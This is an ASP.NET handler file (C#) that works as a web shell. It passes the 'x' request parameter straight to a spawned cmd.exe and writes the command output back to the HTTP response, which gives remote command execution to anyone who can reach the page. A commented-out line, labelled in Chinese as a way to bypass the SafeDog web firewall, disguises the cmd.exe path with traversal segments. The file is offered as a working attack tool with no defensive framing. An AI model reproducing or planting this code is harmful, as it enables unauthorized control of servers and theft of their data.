<%@ WebHandler Language="C#" Class="Handler2" %>
using System;
using System.Collections.Generic; 
using System.Diagnostics;
using System.Web;
public class Handler2 : IHttpHandler {
public void ProcessRequest (HttpContext context) {
//string x = "-an";
string x = context.Request["x"];
Process prc=new Process(); 
//绕过安全狗
//prc.StartInfo.FileName="C:\\WINDOWS\\Microsoft.NET\\Framework\\v1.1.4322\\csc.exe\\..\\..\\..\\..\\system32\\cmd.exe";
prc.StartInfo.FileName="cmd.exe";  
prc.StartInfo.UseShellExecute=false; 
prc.StartInfo.RedirectStandardInput = true; 
prc.StartInfo.RedirectStandardOutput = true; 
prc.StartInfo.RedirectStandardError = true; 
prc.StartInfo.CreateNoWindow = false; 
prc.Start();
prc.StandardInput.WriteLine(x);
prc.StandardInput.Close();
context.Response.Write(prc.StandardOutput.ReadToEnd());
context.Response.End();}
 public bool IsReusable {
        get {
            return false;
        }
    }}
